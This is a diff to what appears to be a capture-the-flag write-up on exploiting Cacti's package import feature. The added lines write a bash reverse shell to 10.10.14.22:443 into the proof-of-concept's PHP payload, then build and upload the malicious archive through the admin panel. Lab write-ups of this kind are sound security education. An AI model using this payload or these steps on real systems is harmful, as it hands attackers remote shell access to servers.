@@ -351,7 +351,7 @@ available databases [2]:
 
 There are two databases.
 
-The most interesting one `monitorsthree_db`, so let's enumerate its tables:
+The most interesting one is `monitorsthree_db`, so let's enumerate its tables:
 
 <br />
 
@@ -482,4 +482,45 @@ As we can see, the `POC` is a php script that is going to create a `.xml.gz` fil
 
 Once the file is created, we need to `upload` it to Cacti in the "import package" section and access the upload path to `run` the command.
 
+Before run the script, we're going to replace the "$filedata" content with a bash reverse shell:
+
 <br />
+
+```php
+$filedata = "<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.22/443 0>&1\"'); ?>")
+```
+
+<br />
+
+Then, we run the php `exploit` to create the file:
+
+<br />
+
+```bash
+❯ php exploit.php
+❯ ls
+ exploit.php   test.xml.gz
+```
+
+<br />
+
+File created successfully!
+
+<br />
+
+Now we can get back to the Cacti admin panel and go to `"Import/Export"` -> `"Import Packages"` to select the file:
+
+<br />
+
+
+
+<br />
+
+And we upload it:
+
+<br />
+
+
+
+<br />
+
